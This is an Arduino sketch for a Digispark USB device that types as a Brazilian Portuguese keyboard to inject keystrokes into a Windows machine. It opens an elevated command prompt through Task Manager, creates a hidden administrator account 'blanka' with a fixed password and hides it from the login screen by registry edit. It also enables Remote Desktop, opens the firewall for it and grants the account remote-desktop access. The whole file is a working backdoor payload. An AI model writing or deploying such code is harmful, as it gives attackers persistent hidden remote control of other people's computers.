#include "DigiKeyboardPtBr.h"
// netsh advfirewall firewall set rule group=bslash"Área de Trabalho Remotabslash" new enable=yes
const uint8_t key_arr_1[] PROGMEM = {0,17, 0,8, 0,23, 0,22, 0,11, 0,44, 0,4, 0,7, 0,25, 0,9, 0,12, 0,21, 0,8, 0,26, 0,4, 0,15, 0,15, 0,44, 0,9, 0,12, 0,21, 0,8, 0,26, 0,4, 0,15, 0,15, 0,44, 0,22, 0,8, 0,23, 0,44, 0,21, 0,24, 0,15, 0,8, 0,44, 0,10, 0,21, 0,18, 0,24, 0,19, 0,46, 0,100, 2,53, 0,47, 2,4, 0,21, 0,8, 0,4, 0,44, 0,7, 0,8, 0,44, 2,23, 0,21, 0,4, 0,5, 0,4, 0,15, 0,11, 0,18, 0,44, 2,21, 0,8, 0,16, 0,18, 0,23, 0,4, 0,100, 2,53, 0,44, 0,17, 0,8, 0,26, 0,44, 0,8, 0,17, 0,4, 0,5, 0,15, 0,8, 0,46, 0,28, 0,8, 0,22};
// net localgroup "Usuários da área de trabalho remota" blanka /add
const uint8_t key_arr_2[] PROGMEM = {0,17, 0,8, 0,23, 0,44, 0,15, 0,18, 0,6, 0,4, 0,15, 0,10, 0,21, 0,18, 0,24, 0,19, 0,44, 2,53, 2,24, 0,22, 0,24, 0,47, 0,4, 0,21, 0,12, 0,18, 0,22, 0,44, 0,7, 0,4, 0,44, 0,47, 0,4, 0,21, 0,8, 0,4, 0,44, 0,7, 0,8, 0,44, 0,23, 0,21, 0,4, 0,5, 0,4, 0,15, 0,11, 0,18, 0,44, 0,21, 0,8, 0,16, 0,18, 0,23, 0,4, 2,53, 0,44, 0,5, 0,15, 0,4, 0,17, 0,14, 0,4, 0,44, 64,20, 0,4, 0,7, 0,7};

#define KEY_TAB 0x2b
void setup() {
  pinMode(0,OUTPUT); //LED on model B
  pinMode(1,OUTPUT); //LED on model A    
}

void loop() {
  pisca_led(100);
  DigiKeyboardPtBr.update();
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(3000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboardPtBr.delay(200);
  DigiKeyboardPtBr.println("taskmgr"); //starting taskmgr
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_A, MOD_ALT_LEFT); 
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);//run
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("cmd /k mode con: cols=15 lines=1");//start cmd
  DigiKeyboardPtBr.delay(200);
  DigiKeyboardPtBr.sendKeyStroke(KEY_TAB); 
  DigiKeyboardPtBr.delay(200);
  DigiKeyboardPtBr.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboardPtBr.delay(500);  
  DigiKeyboardPtBr.println("net user blanka Ping@123 /ADD");//adding user
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("net localgroup Administradores blanka /ADD");//adding user to admin group
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f"));//Hiding user from login screen
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));//Turning Remote desktop
  DigiKeyboardPtBr.delay(500);
  comandosComAcentoString(key_arr_1, sizeof(key_arr_1)); // STRING netsh advfirewall firewall set rule gro...
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboardPtBr.delay(500);
  comandosComAcentoString(key_arr_2, sizeof(key_arr_2)); // STRING net localgroup bslash"Usuários da área ...
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboardPtBr.delay(500);  
  DigiKeyboardPtBr.println("exit");//adding created user to remote desktop group
  DigiKeyboardPtBr.delay(500);
  pisca_led(500); 
  for(;;){ /*empty*/ }
}

void pisca_led(int velocidade){  
  for (int inicio =1; inicio <= 10; inicio ++) {
    digitalWrite(0, HIGH); // LED on <--> Action start
    digitalWrite(1, HIGH); // LED on <--> Action start
    DigiKeyboardPtBr.delay(velocidade);  
    digitalWrite(0, LOW); // LED off <--> Action end
    digitalWrite(1, LOW); // LED off <--> Action end
    DigiKeyboardPtBr.delay(velocidade);  
  } 
}

void comandosComAcentoString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}